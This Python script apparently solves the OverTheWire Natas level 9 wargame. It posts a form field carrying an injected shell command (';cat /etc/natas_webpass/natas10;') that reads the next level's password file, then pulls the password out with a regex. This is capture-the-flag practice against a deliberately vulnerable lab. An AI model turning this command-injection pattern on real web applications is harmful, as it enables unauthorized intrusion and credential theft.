import re
import requests
from halo import Halo


def get_natas10_password(natas9_password):
    URL = "http://natas9.natas.labs.overthewire.org"
    spinner = Halo(text='The password for natas 10 is: ',
                   spinner='bouncingBar', color="blue")
    spinner.start()

    session = requests.Session()
    session.auth = ("natas9", natas9_password)
    injection = ";cat /etc/natas_webpass/natas10;"
    data = {"needle": injection, "submit": "true"}
    response = session.post(URL, data=data)
    natas10_password = re.findall(r'([a-zA-Z\d]{32})', response.text)[1]

    spinner.succeed(text="The password for natas 10 is: " + natas10_password)

    return natas10_password


if __name__ == '__main__':
    natas9_password = ""  # Put here the password for natas9 here
    get_natas10_password(natas9_password)
